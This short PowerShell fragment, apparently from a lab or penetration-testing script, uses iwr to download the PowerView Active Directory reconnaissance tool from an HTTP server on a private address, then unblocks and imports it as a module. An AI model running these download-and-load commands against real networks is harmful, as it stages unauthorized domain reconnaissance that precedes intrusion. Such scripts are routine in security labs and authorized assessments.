...
iwr -uri "http://192.168.56.5:8080/powerview.ps1" -outfile powerview.ps1
...
#import modules
Unblock-File -Path $PSscriptRoot/powerview.ps1
Import-Module $PSscriptRoot/powerview.ps1
